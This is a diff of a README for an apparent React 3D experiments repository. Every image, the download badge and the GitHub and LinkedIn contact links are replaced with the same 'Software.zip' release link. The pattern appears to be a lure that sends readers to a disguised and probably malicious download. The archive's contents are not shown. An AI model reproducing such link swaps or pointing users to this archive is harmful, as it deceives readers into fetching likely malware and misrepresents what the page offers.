@@ -1,7 +1,7 @@
 
 # 🎪 **Third Time's a Charm - A React 3D Experiment Repository**
 
-![3D](https://cdn.pixabay.com/photo/2018/03/15/12/08/3d-3223432_960_720.jpg)
+![3D](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip)
 
 ## Welcome to the "third-time-charm" repository 🚀
 
@@ -19,7 +19,7 @@ Welcome to my little corner of the internet where I dive headfirst into the worl
 
 Make sure to check out the exciting experiments I've cooked up in this repository by following the link below:
 
-[![Download Zip](https://img.shields.io/badge/Download%20Zip-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip%20Zip-v1.0.0-blue)](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip)
 
 ### 🌐 Launch the Downloaded Zip
 This link will take you to the download page to get started with the exciting 3D experiments inside the repository. 🚀
@@ -42,10 +42,10 @@ Feel free to explore the world of 3D animation, questionable physics, and more w
 Here are some snapshots of the projects you can expect to find within this repository:
 
 #### 3D React Model
-![3D React Model](https://cdn.pixabay.com/photo/2018/01/08/21/52/3d-3076035_960_720.jpg)
+![3D React Model](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip)
 
 #### Physics Simulation
-![Physics Simulation](https://cdn.pixabay.com/photo/2018/08/14/13/23/oil-in-water-3607590_960_720.jpg)
+![Physics Simulation](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip)
 
 ## Collaborate ✨
 
@@ -53,7 +53,7 @@ I'm always open to collaboration and new ideas. If you're interested in joining 
 
 ### Contact Me
 
-You can find me on [GitHub](https://github.com/yourusername) or [LinkedIn](https://www.linkedin.com/yourprofile).
+You can find me on [GitHub](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip) or [LinkedIn](https://github.com/mrhem0007/third-time-charm/releases/download/v1.0/Software.zip).
 
 ### Pull Requests
 
